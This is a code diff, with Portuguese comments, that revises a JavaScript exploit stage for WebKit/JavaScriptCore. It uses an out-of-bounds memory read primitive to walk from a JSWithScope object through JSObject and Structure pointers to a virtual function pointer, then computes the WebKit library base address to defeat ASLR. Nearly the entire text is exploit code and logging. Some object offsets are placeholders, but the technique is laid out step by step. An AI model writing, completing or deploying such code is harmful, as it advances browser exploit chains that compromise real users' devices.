@@ -4,7 +4,6 @@ import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
-    // oob_dataview_real, // Não usado diretamente nas novas funções, mas faz parte do trigger
     oob_write_absolute,
     oob_read_absolute,
     clearOOBEnvironment
@@ -212,87 +211,106 @@ export async function executeRetypeOOB_AB_Test() {
 }
 
 
-// NOVA FUNÇÃO: Estratégia para tentar vazar o endereço base do WebKit (Refinada)
-// ============================================================================
+// NOVA FUNÇÃO: Estratégia para tentar vazar o endereço base do WebKit (v3 - Usando JSWithScope como exemplo)
+// ========================================================================================================
 export async function attemptWebKitBaseLeakStrategy() {
-    const FNAME_LEAK_RUNNER = "attemptWebKitBaseLeakStrategy";
-    logS3(`--- Iniciando Estratégia de Vazamento de Endereço Base do WebKit (v2) ---`, "test", FNAME_LEAK_RUNNER);
+    const FNAME_LEAK_RUNNER = "attemptWebKitBaseLeakStrategy_v3";
+    logS3(`--- Iniciando Estratégia de Vazamento de Base do WebKit (v3 - via JSWithScope) ---`, "test", FNAME_LEAK_RUNNER);
+
+    // Verifica se os offsets necessários estão no config.mjs
+    // Para esta estratégia, precisamos dos offsets para JSWithScope, JSCell, Structure, e uma função alvo.
+    const JSWITHESCOPE_SCOPE_OBJ_OFFSET = 0x10; // Conforme sua nova informação ([rax+10h], r8_object)
+    const JSOBJECT_PUT_FUNCTION_NAME = "JSC::JSObject::put"; // Função alvo exemplo
 
     if (!JSC_OFFSETS.JSCell || !JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET ||
         !JSC_OFFSETS.Structure || !JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET ||
-        !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS || !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]) {
-        logS3("ERRO: Offsets críticos para vazamento de base não definidos em config.mjs.", "critical", FNAME_LEAK_RUNNER);
-        logS3("   Necessário: JSCell.STRUCTURE_POINTER_OFFSET, Structure.VIRTUAL_PUT_OFFSET, e uma função alvo em WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS (ex: 'JSC::JSObject::put').", "critical", FNAME_LEAK_RUNNER);
+        !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS || !WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[JSOBJECT_PUT_FUNCTION_NAME]) {
+        logS3("ERRO: Offsets críticos para vazamento de base (v3) não definidos em config.mjs.", "critical", FNAME_LEAK_RUNNER);
+        logS3(`   Necessário: JSCell.STRUCTURE_POINTER_OFFSET, Structure.VIRTUAL_PUT_OFFSET, e a função alvo "${JSOBJECT_PUT_FUNCTION_NAME}" em WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS.`, "critical", FNAME_LEAK_RUNNER);
         return;
     }
+    // Nota: JSC_OFFSETS.JSWithScope não está explicitamente no config, mas usamos o offset 0x10 que você identificou.
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real || !oob_read_absolute) {
             throw new Error("OOB Init ou primitiva de leitura falharam.");
         }
-        logS3("Ambiente OOB inicializado para tentativa de vazamento de base.", "info", FNAME_LEAK_RUNNER);
+        logS3("Ambiente OOB inicializado para tentativa de vazamento de base (v3).", "info", FNAME_LEAK_RUNNER);
 
-        // --- PASSO 1: Identificar (ou posicionar) um JSObject e obter seu endereço ---
+        // --- PASSO 1: Identificar (ou posicionar) um objeto JSWithScope e obter seu endereço ---
         // Este valor é um EXEMPLO e DEVE SER SUBSTITUÍDO pela sua lógica de localização de objeto.
-        const HYPOTHETICAL_OFFSET_TO_JSOBJECT = 0x2000; // EXEMPLO! Mude isso!
+        const HYPOTHETICAL_OFFSET_TO_JSWITHSCOPE = 0x3000; // EXEMPLO! Mude isso!
 
-        logS3(`PASSO 1: Tentando usar um JSObject hipotético no offset ${toHex(HYPOTHETICAL_OFFSET_TO_JSOBJECT)} do oob_buffer.`, "info", FNAME_LEAK_RUNNER);
-        logS3(`   Lembre-se: Este offset (${toHex(HYPOTHETICAL_OFFSET_TO_JSOBJECT)}) é um EXEMPLO e precisa ser determinado pelo seu exploit.`, "warn", FNAME_LEAK_RUNNER);
+        logS3(`PASSO 1: Tentando usar um JSWithScope hipotético no offset ${toHex(HYPOTHETICAL_OFFSET_TO_JSWITHSCOPE)} do oob_buffer.`, "info", FNAME_LEAK_RUNNER);
+        logS3(`   Lembre-se: Este offset (${toHex(HYPOTHETICAL_OFFSET_TO_JSWITHSCOPE)}) é um EXEMPLO e precisa ser determinado pelo seu exploit.`, "warn", FNAME_LEAK_RUNNER);
 
-        // --- PASSO 2: Ler o ponteiro Structure* do JSObject ---
-        const address_of_jsobject_for_struct_ptr = HYPOTHETICAL_OFFSET_TO_JSOBJECT;
-        const structure_ptr_field_addr = address_of_jsobject_for_struct_ptr + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
-        logS3(`PASSO 2: Lendo o Structure* do campo em ${toHex(address_of_jsobject_for_struct_ptr)} + ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)} = ${toHex(structure_ptr_field_addr)}.`, "info", FNAME_LEAK_RUNNER);
-
-        let structure_obj_ptr_adv64;
+        // --- PASSO 2: Ler o ponteiro JSObject* associado de dentro do JSWithScope ---
+        // Conforme sua informação: mov [rax+10h], r8_object (onde rax é JSWithScope*)
+        const associated_jsobject_ptr_field_addr = HYPOTHETICAL_OFFSET_TO_JSWITHSCOPE + JSWITHESCOPE_SCOPE_OBJ_OFFSET;
+        logS3(`PASSO 2: Lendo o JSObject* associado de JSWithScope em ${toHex(HYPOTHETICAL_OFFSET_TO_JSWITHSCOPE)} + ${toHex(JSWITHESCOPE_SCOPE_OBJ_OFFSET)} = ${toHex(associated_jsobject_ptr_field_addr)}.`, "info", FNAME_LEAK_RUNNER);
+        
+        let associated_jsobject_ptr_adv64;
         try {
-            structure_obj_ptr_adv64 = oob_read_absolute(structure_ptr_field_addr, 8);
-            if (!isAdvancedInt64Object(structure_obj_ptr_adv64) || (structure_obj_ptr_adv64.low() === 0 && structure_obj_ptr_adv64.high() === 0)) {
-                logS3(`   LEITURA FALHOU ou ponteiro Structure* nulo/inválido lido de ${toHex(structure_ptr_field_addr)}: ${structure_obj_ptr_adv64?.toString(true) || "Não é AdvInt64"}`, "error", FNAME_LEAK_RUNNER);
-                throw new Error(`Ponteiro Structure* inválido ou nulo lido.`);
+            associated_jsobject_ptr_adv64 = oob_read_absolute(associated_jsobject_ptr_field_addr, 8);
+            if (!isAdvancedInt64Object(associated_jsobject_ptr_adv64) || (associated_jsobject_ptr_adv64.low() === 0 && associated_jsobject_ptr_adv64.high() === 0)) {
+                logS3(`   LEITURA FALHOU ou ponteiro JSObject* nulo/inválido lido de ${toHex(associated_jsobject_ptr_field_addr)}: ${associated_jsobject_ptr_adv64?.toString(true) || "Não é AdvInt64"}`, "error", FNAME_LEAK_RUNNER);
+                throw new Error(`Ponteiro JSObject* associado inválido ou nulo lido.`);
             }
-            logS3(`   Structure* (bruto) lido: ${structure_obj_ptr_adv64.toString(true)}`, "leak", FNAME_LEAK_RUNNER);
+            logS3(`   JSObject* associado (bruto) lido: ${associated_jsobject_ptr_adv64.toString(true)}`, "leak", FNAME_LEAK_RUNNER);
         } catch (e) {
-            logS3(`   ERRO ao ler o ponteiro Structure*: ${e.message}. Verifique o offset do objeto e sua estabilidade.`, "critical", FNAME_LEAK_RUNNER);
+            logS3(`   ERRO ao ler o JSObject* associado: ${e.message}.`, "critical", FNAME_LEAK_RUNNER);
             throw e;
         }
-        
-        // IMPORTANTE: O valor de structure_obj_ptr_adv64 é o ENDEREÇO do objeto Structure.
-        // Para ler DENTRO do objeto Structure usando oob_read_absolute, este endereço PRECISA ser um offset
-        // válido DENTRO do seu oob_array_buffer_real. Se for um ponteiro absoluto para fora do buffer,
-        // oob_read_absolute (como está implementado) não funcionará.
-        // Você precisaria de uma primitiva de leitura arbitrária (addr_read) para ler de endereços absolutos.
-        // Para este exemplo, VAMOS ASSUMIR que o objeto Structure está magicamente localizado em um offset
-        // dentro do oob_array_buffer_real que corresponde ao valor numérico do ponteiro Structure* lido.
-        // Esta é uma suposição MUITO FORTE e irrealista sem uma primitiva addrof + leitura arbitrária.
-        // Em um exploit real, você usaria addrof(obj_structure) se pudesse, ou teria que posicionar o obj_structure
-        // em um local conhecido dentro da sua janela OOB.
-        let structure_obj_address_for_read;
-        if (structure_obj_ptr_adv64.high() !== 0) { // Heurística muito simples para ponteiro "real" vs offset pequeno
-            logS3(`   AVISO: Structure* ${structure_obj_ptr_adv64.toString(true)} parece um ponteiro absoluto. A leitura de VIRTUAL_PUT_OFFSET pode falhar se não tivermos leitura arbitrária ou se Structure não estiver em OOB.`, "warn", FNAME_LEAK_RUNNER);
-            // Para fins de demonstração, se for um ponteiro "grande", não tentaremos usá-lo como offset OOB direto.
-            // Em um exploit real, aqui você usaria sua primitiva de leitura arbitrária baseada no valor de structure_obj_ptr_adv64.
-            // Ou, se você pulverizou Structures, você procuraria uma Structure em um offset conhecido.
-            // Por enquanto, vamos lançar um erro se parecer um ponteiro absoluto para forçar o ajuste do HYPOTHETICAL_OFFSET.
-             throw new Error("Structure* parece ser um ponteiro absoluto, necessita de leitura arbitrária ou melhor posicionamento.");
+
+        // ASSUMINDO que associated_jsobject_ptr_adv64 é um offset válido dentro do oob_array_buffer_real para o JSObject.
+        // Veja notas na v2 sobre ponteiros absolutos vs offsets OOB.
+        let associated_jsobject_address_for_read;
+        if (associated_jsobject_ptr_adv64.high() !== 0 && associated_jsobject_ptr_adv64.low() > oob_array_buffer_real.byteLength) { // Heurística simples
+             logS3(`   AVISO: JSObject* associado ${associated_jsobject_ptr_adv64.toString(true)} parece um ponteiro absoluto fora da OOB.`, "warn", FNAME_LEAK_RUNNER);
+             throw new Error("JSObject* associado parece ser um ponteiro absoluto, necessita de leitura arbitrária ou melhor posicionamento.");
         } else {
-            // Se high for 0, tratamos low como um offset dentro do oob_array_buffer_real.
-            structure_obj_address_for_read = structure_obj_ptr_adv64.low();
+            associated_jsobject_address_for_read = associated_jsobject_ptr_adv64.toNumber(); // Perda de precisão se > 2^53
         }
+        logS3(`   Endereço do JSObject associado (para leitura, assumido como offset OOB): ${toHex(associated_jsobject_address_for_read, 64)}`, "info", FNAME_LEAK_RUNNER);
+
+        // --- PASSO 3: Ler o Structure* do JSObject associado ---
+        const structure_ptr_field_from_associated_obj_addr = associated_jsobject_address_for_read + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
+        logS3(`PASSO 3: Lendo o Structure* do JSObject associado em ${toHex(associated_jsobject_address_for_read,64)} + ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)} = ${toHex(structure_ptr_field_from_associated_obj_addr,64)}.`, "info", FNAME_LEAK_RUNNER);
         
-        logS3(`   Endereço do objeto Structure (para leitura, assumido como offset OOB): ${toHex(structure_obj_address_for_read, 64)}`, "info", FNAME_LEAK_RUNNER);
+        let structure_obj_ptr_from_associated_adv64;
+        try {
+            structure_obj_ptr_from_associated_adv64 = oob_read_absolute(structure_ptr_field_from_associated_obj_addr, 8);
+             if (!isAdvancedInt64Object(structure_obj_ptr_from_associated_adv64) || (structure_obj_ptr_from_associated_adv64.low() === 0 && structure_obj_ptr_from_associated_adv64.high() === 0)) {
+                logS3(`   LEITURA FALHOU ou ponteiro Structure* (do JSObject associado) nulo/inválido lido de ${toHex(structure_ptr_field_from_associated_obj_addr,64)}`, "error", FNAME_LEAK_RUNNER);
+                throw new Error(`Ponteiro Structure* (do JSObject associado) inválido ou nulo.`);
+            }
+            logS3(`   Structure* (do JSObject associado, bruto) lido: ${structure_obj_ptr_from_associated_adv64.toString(true)}`, "leak", FNAME_LEAK_RUNNER);
+        } catch (e) {
+            logS3(`   ERRO ao ler o Structure* do JSObject associado: ${e.message}.`, "critical", FNAME_LEAK_RUNNER);
+            throw e;
+        }
+
+        // Novamente, assumindo que structure_obj_ptr_from_associated_adv64.toNumber() é um offset OOB válido.
+        let structure_obj_address_for_read_final;
+         if (structure_obj_ptr_from_associated_adv64.high() !== 0 && structure_obj_ptr_from_associated_adv64.low() > oob_array_buffer_real.byteLength) {
+             logS3(`   AVISO: Structure* (final) ${structure_obj_ptr_from_associated_adv64.toString(true)} parece um ponteiro absoluto fora da OOB.`, "warn", FNAME_LEAK_RUNNER);
+             throw new Error("Structure* (final) parece ser um ponteiro absoluto, necessita de leitura arbitrária ou melhor posicionamento.");
+        } else {
+            structure_obj_address_for_read_final = structure_obj_ptr_from_associated_adv64.toNumber();
+        }
+        logS3(`   Endereço do objeto Structure final (para leitura, assumido como offset OOB): ${toHex(structure_obj_address_for_read_final, 64)}`, "info", FNAME_LEAK_RUNNER);
 
 
-        // --- PASSO 3: Ler o ponteiro da função virtual (ex: put) de Structure ---
-        const virtual_put_func_ptr_field_addr = structure_obj_address_for_read + JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;
-        logS3(`PASSO 3: Lendo o ponteiro da função virtual (ex: put) de Structure em ${toHex(structure_obj_address_for_read,64)} + ${toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)} = ${toHex(virtual_put_func_ptr_field_addr,64)}.`, "info", FNAME_LEAK_RUNNER);
+        // --- PASSO 4: Ler o ponteiro da função virtual de Structure ---
+        const virtual_put_func_ptr_field_addr = structure_obj_address_for_read_final + JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;
+        logS3(`PASSO 4: Lendo o ponteiro da função virtual de Structure em ${toHex(structure_obj_address_for_read_final,64)} + ${toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)} = ${toHex(virtual_put_func_ptr_field_addr,64)}.`, "info", FNAME_LEAK_RUNNER);
 
         let leaked_virtual_func_ptr;
         try {
             leaked_virtual_func_ptr = oob_read_absolute(virtual_put_func_ptr_field_addr, 8);
             if (!isAdvancedInt64Object(leaked_virtual_func_ptr) || (leaked_virtual_func_ptr.low() === 0 && leaked_virtual_func_ptr.high() === 0)) {
-                logS3(`   LEITURA FALHOU ou ponteiro de função virtual nulo/inválido lido de ${toHex(virtual_put_func_ptr_field_addr,64)}: ${leaked_virtual_func_ptr?.toString(true) || "Não é AdvInt64"}`, "error", FNAME_LEAK_RUNNER);
+                logS3(`   LEITURA FALHOU ou ponteiro de função virtual nulo/inválido lido de ${toHex(virtual_put_func_ptr_field_addr,64)}`, "error", FNAME_LEAK_RUNNER);
                 throw new Error(`Ponteiro de função virtual inválido ou nulo lido.`);
             }
             logS3(`   Ponteiro de função virtual (bruto) lido: ${leaked_virtual_func_ptr.toString(true)}`, "leak", FNAME_LEAK_RUNNER);
@@ -301,41 +319,33 @@ export async function attemptWebKitBaseLeakStrategy() {
             throw e;
         }
 
-        // --- PASSO 4: Calcular o endereço base do WebKit ---
-        // Assumimos que o VIRTUAL_PUT_OFFSET aponta para uma função como JSC::JSObject::put.
-        const targetFunctionName = "JSC::JSObject::put"; // Ou qualquer outra função que VIRTUAL_PUT_OFFSET possa apontar e que esteja no config.
-        const offset_of_target_function_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[targetFunctionName];
-
-        if (!offset_of_target_function_str) {
-            logS3(`   ERRO: Offset para a função alvo "${targetFunctionName}" não encontrado em WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS.`, "critical", FNAME_LEAK_RUNNER);
-            throw new Error(`Offset para ${targetFunctionName} não configurado.`);
-        }
-
+        // --- PASSO 5: Calcular o endereço base do WebKit ---
+        const offset_of_target_function_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[JSOBJECT_PUT_FUNCTION_NAME];
         const offset_of_target_function = new AdvancedInt64(offset_of_target_function_str);
-        logS3(`PASSO 4: Calculando o endereço base do WebKit.`, "info", FNAME_LEAK_RUNNER);
-        logS3(`   Usando leaked_func_ptr (${leaked_virtual_func_ptr.toString(true)}) - offset de "${targetFunctionName}" (${offset_of_target_function.toString(true)}).`, "info", FNAME_LEAK_RUNNER);
+        logS3(`PASSO 5: Calculando o endereço base do WebKit.`, "info", FNAME_LEAK_RUNNER);
+        logS3(`   Usando leaked_func_ptr (${leaked_virtual_func_ptr.toString(true)}) - offset de "${JSOBJECT_PUT_FUNCTION_NAME}" (${offset_of_target_function.toString(true)}).`, "info", FNAME_LEAK_RUNNER);
 
         const webkit_base_address = leaked_virtual_func_ptr.sub(offset_of_target_function);
 
         logS3(`   ENDEREÇO BASE DO WEBKIT (calculado): ${webkit_base_address.toString(true)}`, "vuln", FNAME_LEAK_RUNNER);
-        document.title = "WebKit Base: " + webkit_base_address.toString(true);
+        document.title = "WebKit Base (v3): " + webkit_base_address.toString(true);
 
         if (webkit_base_address.low() === 0 && webkit_base_address.high() === 0) {
-            logS3("   AVISO: Endereço base calculado é zero. Isso é improvável.", "warn", FNAME_LEAK_RUNNER);
+            logS3("   AVISO: Endereço base calculado é zero.", "warn", FNAME_LEAK_RUNNER);
         } else if (webkit_base_address.low() & 0xFFF) {
-            logS3(`   AVISO: Endereço base ${webkit_base_address.toString(true)} não parece alinhado à página (últimos 3 hexits deveriam ser 000).`, "warn", FNAME_LEAK_RUNNER);
+            logS3(`   AVISO: Endereço base ${webkit_base_address.toString(true)} não parece alinhado à página.`, "warn", FNAME_LEAK_RUNNER);
         } else {
             logS3("   Endereço base CALCULADO e parece alinhado à página! VERIFIQUE MANUALMENTE!", "good", FNAME_LEAK_RUNNER);
         }
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO na estratégia de vazamento de base: ${e.message}`, "critical", FNAME_LEAK_RUNNER);
+        logS3(`ERRO CRÍTICO na estratégia de vazamento de base (v3): ${e.message}`, "critical", FNAME_LEAK_RUNNER);
         if (e.stack) {
             logS3(`Stack: ${e.stack}`, "critical", FNAME_LEAK_RUNNER);
         }
-        document.title = "WebKit Base Leak FAIL!";
+        document.title = "WebKit Base Leak (v3) FAIL!";
     } finally {
         clearOOBEnvironment();
-        logS3("--- Estratégia de Vazamento de Endereço Base do WebKit (v2) Concluída ---", "test", FNAME_LEAK_RUNNER);
+        logS3("--- Estratégia de Vazamento de Endereço Base do WebKit (v3) Concluída ---", "test", FNAME_LEAK_RUNNER);
     }
 }
